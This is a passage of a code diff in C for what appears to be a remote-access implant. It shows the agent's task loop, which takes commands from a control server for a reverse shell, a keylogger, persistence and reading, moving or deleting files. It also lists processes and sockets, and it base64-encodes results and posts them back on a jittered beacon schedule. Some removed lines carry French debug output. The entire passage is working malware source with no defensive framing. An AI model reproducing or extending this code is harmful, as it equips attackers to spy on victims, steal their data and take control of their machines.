+                    lhost = json_object_get_string(lhost_field);
+                if (json_object_object_get_ex(revshell_field, "port", &lport_field))
+                    lport = json_object_get_int(lport_field);
+                result = send_reverse_shell(lhost, lport);
+            }
+            else if (json_object_object_get_ex(action_field, "KEYLOG", &keylog_field)) {
+                struct json_object *state_field, *filepath_field;
+                const char *state = NULL, *filepath = NULL;
+                if (json_object_object_get_ex(keylog_field, "status", &state_field))
+                    state = json_object_get_string(state_field);
+                if (json_object_object_get_ex(keylog_field, "path", &filepath_field))
+                    filepath = json_object_get_string(filepath_field);
+                result = toggle_keylogger(state, filepath);
+            }
+            else if (json_object_object_get_ex(action_field, "PERSIST", &persist_field)) {
+                struct json_object *state_field;
+                const char *state = NULL;
+                if (json_object_object_get_ex(persist_field, "status", &state_field))
+                    state = json_object_get_string(state_field);
+                result = toggle_persistence(state);
+            }
+            else if (json_object_object_get_ex(action_field, "CAT", &cat_field)) {
+                struct json_object *filepath_field;
+                const char *filepath = NULL;
+                if (json_object_object_get_ex(cat_field, "path", &filepath_field))
+                    filepath = json_object_get_string(filepath_field);
+                result = read_file(filepath ? filepath : "null");
+            }
+            else if (json_object_object_get_ex(action_field, "MV", &mv_field)) {
+                struct json_object *src_field, *dst_field;
+                const char *src = NULL, *dst = NULL;
+                if (json_object_object_get_ex(mv_field, "src", &src_field))
+                    src = json_object_get_string(src_field);
+                if (json_object_object_get_ex(mv_field, "dst", &dst_field))
+                    dst = json_object_get_string(dst_field);
+                result = move_file(src ? src : "null", dst ? dst : "null");
+            }
+            else if (json_object_object_get_ex(action_field, "RM", &rm_field)) {
+                struct json_object *filepath_field;
+                const char *filepath = NULL;
+                if (json_object_object_get_ex(rm_field, "path", &filepath_field))
+                    filepath = json_object_get_string(filepath_field);
+                result = remove_file(filepath ? filepath : "null");
+            }
+            else if (json_object_object_get_ex(action_field, "PS", &ps_field)) {
                 result = list_processes();
-                printf("Résultat PS : %s\n", result);
-            } else {
-                result = strdup("Erreur : tâche non reconnue");
+            }
+            else if (json_object_object_get_ex(action_field, "NETSTAT", &netstat_field)) {
+                result = list_sockets();
+            }
+            else {
+                result = strdup("Error: Unrecognized task");
             }
 
             if (result) {
                 char *encoded_result = base64_encode(result);
-                if (!encoded_result) {
-                    fprintf(stderr, "Erreur : échec de l'encodage en base64\n");
-                    free(result);
-                    free(task_uid);
-                    json_object_put(parsed_json);
-                    free(json);
-                    SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
-                    continue;
-                }
+                if (encoded_result) {
+                    clean_string(encoded_result);
+                    memset(json, 0, sizeof(json));
+                    snprintf(json, sizeof(json),
+                              "{\"RESULT\":{\"agent_uid\":\"%s\",\"task_uid\":\"%s\",\"output\":\"%s\"}}",
+                              implant_uid, task_uid, encoded_result);
+                    printf("RESULT JSON sent: %s\n", json);
 
-                // Construire le JSON avec json-c
-                struct json_object *result_obj = json_object_new_object();
-                json_object_object_add(result_obj, "agent_uid", json_object_new_string(implant_uid));
-                json_object_object_add(result_obj, "task_uid", json_object_new_string(task_uid));
-                json_object_object_add(result_obj, "output", json_object_new_string(encoded_result));
-
-                const char *json_str = json_object_to_json_string_ext(result_obj, JSON_C_TO_STRING_PLAIN);
-                size_t json_len = strlen(json_str);
-                if (json_len >= JSON_BUFFER_SIZE - 1) {
-                    fprintf(stderr, "Erreur : JSON trop grand (%zu octets), troncature forcée\n", json_len);
-                    snprintf(json, JSON_BUFFER_SIZE, "{\"agent_uid\":\"%s\",\"task_uid\":\"%s\",\"output\":\"Erreur : liste trop longue\"}", implant_uid, task_uid);
-                } else {
-                    strncpy(json, json_str, JSON_BUFFER_SIZE - 1);
-                    json[JSON_BUFFER_SIZE - 1] = '\0';
-                }
-
-                printf("JSON RESULT envoyé : %s\n", json);
-
-                // Vérifier la connectivité avant envoi
-                CURL *test_curl = curl_easy_init();
-                if (test_curl) {
-                    curl_easy_setopt(test_curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
-                    curl_easy_setopt(test_curl, CURLOPT_NOBODY, 1L); // HEAD request pour tester
-                    curl_easy_setopt(test_curl, CURLOPT_TIMEOUT, 5L);
-                    res = curl_easy_perform(test_curl);
-                    if (res != CURLE_OK) {
-                        fprintf(stderr, "Erreur : serveur inaccessible avant RESULT : %s\n", curl_easy_strerror(res));
-                    } else {
-                        printf("Serveur accessible avant RESULT\n");
+                    memset(response, 0, sizeof(response));
+                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
+                    res = curl_easy_perform(curl);
+                    if (res == CURLE_OK) {
+                        printf("RESULT response: %s\n", response);
                     }
-                    curl_easy_cleanup(test_curl);
+                    free(encoded_result);
                 }
-
-                // Envoi de la requête RESULT
-                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
-                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-                long http_code = 0;
-                printf("Début envoi requête RESULT...\n");
-                memset(response, 0, sizeof(response));
-                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
-                res = curl_easy_perform(curl);
-                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
-                if (res != CURLE_OK) {
-                    fprintf(stderr, "Erreur RESULT : %s (Code HTTP : %ld)\n", curl_easy_strerror(res), http_code);
-                } else {
-                    printf("Réponse RESULT : %s (Code HTTP : %ld)\n", response, http_code);
-                }
-                printf("Fin envoi requête RESULT\n");
-
-                json_object_put(result_obj);
-                free(encoded_result);
                 free(result);
-                free(task_uid);
-            } else {
-                fprintf(stderr, "Erreur : aucun résultat généré pour la tâche\n");
                 free(task_uid);
             }
         }
         json_object_put(parsed_json);
-        free(json);
-
-        log_keys_to_file();
-        SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
+        Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
     }
-
 
     curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
     curl_global_cleanup();
-    WSACleanup();
-    if (keylog_file) fclose(keylog_file);
     return 0;
 }
